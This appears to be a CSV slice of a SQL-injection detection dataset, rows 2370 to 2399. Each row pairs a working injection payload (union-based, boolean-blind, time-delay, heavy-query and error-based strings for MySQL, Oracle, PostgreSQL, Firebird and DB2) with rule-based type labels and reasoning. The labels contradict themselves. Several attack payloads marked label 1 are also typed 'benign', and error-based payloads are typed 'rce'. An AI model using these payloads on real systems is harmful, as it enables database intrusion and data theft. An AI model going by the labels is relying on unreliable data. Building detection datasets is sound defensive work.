row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2370,1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,1,,boolean_blind,generic,0.95,6496 = 6496 and detected — boolean_blind injection (priority 8) on generic,rule-based
2371,"1%' union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2372,1' ) where 4298 = 4298,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2373,"-5417 or elt ( 1032 = 1032,3623 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2374,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'ynpr' = 'ynpr",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
2375,"-9978"" or make_set ( 4893 = 9765,9765 ) and ""mhjt"" = ""mhjt",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2376,"-7501'+ ( select uloc where 3089 = 3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2377,"1'|| ( select 'iocs' where 9287 = 9287 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2378,"1 ) ) as khvx where 7533 = 7533 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2379,"1' in boolean mode ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
2380,"1"" ) as jtou where 8129 = 8129 and 7533 = 7533--",1,,boolean_blind,generic,0.95,8129 = 8129 and detected — boolean_blind injection (priority 8) on generic,rule-based
2381,1 ) where 6494 = 6494,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2382,"select count ( * ) from generate_series ( 1,5000000 ) and 'dfwj' = 'dfwj",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2383,"1'+ ( select luwn where 1214 = 1214 union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2384,1%' ) ) ) and 2006 = 2006,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2385,"-7235"" ) union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2386,"-3756' ) union all select 1034,1034,1034--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2387,select sleep ( 5 ) and 'gajm' = 'gajm,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2388,"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""twpn"" like ""twpn",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2389,"1"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""wdye"" like ""wdye",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
2390,"1', ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",1,,heavy_query,oracle,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on oracle",rule-based
2391,-3956' ) or ( 8459 = 8459 ) *4906 and ( 'rflo' like 'rflo,1,,boolean_blind,generic,0.95,") or (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
2392,"1,iif ( 1440 = 4612,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
2393,1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'gegg' = 'gegg,1,,boolean_blind,postgresql,0.95,) and ( detected — boolean_blind injection (priority 8) on postgresql,rule-based
2394,"1%"" ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2395,"1"" ) ) as uzvu where 2458 = 2458 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
2396,"1%' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2397,"1 union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2398,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'wvzw' = 'wvzw",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2399,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
